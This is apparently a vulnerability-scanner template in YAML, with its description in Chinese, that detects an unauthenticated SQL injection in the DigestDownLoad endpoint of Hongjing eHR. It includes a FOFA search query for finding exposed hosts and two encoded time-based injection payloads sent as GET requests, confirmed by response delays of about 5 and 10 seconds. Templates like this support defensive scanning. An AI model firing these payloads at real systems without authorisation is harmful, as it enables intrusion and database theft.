id: hongjing-ehr-digestdownLoad-sqli

info:
  name: 宏景人力资源管理系统DigestDownLoad-SQL注入漏洞
  author: avic123
  severity: high
  verified: true
  description: |-
    宏景人力资源管理系统（eHR）是一款由宏景软件研发的系统。宏景人力资源管理系统的 DigestDownLoad 接口处存在SQL注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。
    fofa: app="HJSOFT-HCM"
  reference:
    - https://mrxn.net/jswz/hjsoft-DigestDownLoad-sqli.html
  tags: hongjing,ehr,sqli
  created: 2025/09/03

rules:
  r0:
    request:
      method: GET
      path: /servlet/DigestDownLoad?id=SPAATTP2HJFPAATTPJPAATTP2HJFPAATTPHNvno3W9Sm3WBgDEqPAATTP2HJFPAATTPWzCGPAATTP2HJBPAATTPS0TBXpcPpPAATTP2HJFPAATTP79l7h8PAATTP3HJDPAATTP
    expression: |
      response.status == 302 && response.latency <= 7000 &&  response.latency >= 5000

  r1:
    request:
      method: GET
      path: /servlet/DigestDownLoad?id=SPAATTP2HJFPAATTPJPAATTP2HJFPAATTPHNvno3W9Sm3WBgDEq07BiYzoLVdCov1D1RuNrUIPAATTP3HJDPAATTP
    expression: |
      response.status == 302 && response.latency <= 12000 &&  response.latency >= 10000

expression: r0() && r1()
